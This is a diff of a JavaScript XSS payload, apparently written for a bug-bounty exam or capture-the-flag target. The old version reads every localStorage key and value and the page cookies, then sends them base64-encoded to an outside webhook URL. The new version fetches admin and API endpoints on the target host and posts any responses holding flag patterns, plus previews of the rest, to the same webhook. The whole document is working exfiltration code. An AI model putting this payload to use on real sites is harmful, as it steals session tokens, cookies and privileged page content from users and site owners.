@@ -1,24 +1,31 @@
-<!DOCTYPE html>
-<html>
-<body>
-   <script>
+<script>
     const webhook = "https://webhooksite.net/25131090-f4ff-4799-ab6b-5622f6f2bb64";
     
-    // 1. Try to grab the Token from LocalStorage (Most likely for this exam)
-    // We search for common keys like 'token', 'accessToken', or 'auth'
-    for (let i = 0; i < localStorage.length; i++) {
-        let key = localStorage.key(i);
-        let value = localStorage.getItem(key);
-        fetch(webhook + "?key=" + key + "&value=" + btoa(value));
-    }
+    // List of potential flag locations
+    const targets = [
+        "/admin/dashboard",
+        "/admin/settings",
+        "/api/admin/flag",
+        "/api/system/info",
+        "/admin/notifications"
+    ];
 
-    // 2. Try to grab Cookies
-    if (document.cookie) {
-        fetch(webhook + "?cookies=" + btoa(document.cookie));
-    }
-
-    // 3. Heartbeat - Just to confirm the bot is still alive
-    fetch(webhook + "?status=alive_and_running");
+    targets.forEach(path => {
+        fetch("https://bugbounty-exam.hashacademy.co" + path)
+            .then(r => r.text())
+            .then(data => {
+                // Search for the flag pattern in the response
+                if (data.includes("flag{") || data.includes("hash{")) {
+                    fetch(webhook, {
+                        method: "POST",
+                        mode: "no-cors",
+                        body: "FOUND_FLAG_AT_" + path + ": " + data
+                    });
+                } else {
+                    // Even if no flag, send the first 100 chars to see what's there
+                    fetch(webhook + "?path=" + path + "&preview=" + btoa(data.substring(0,100)));
+                }
+            })
+            .catch(err => fetch(webhook + "?error_at_" + path + "=" + btoa(err)));
+    });
 </script>
-</body>
-</html>
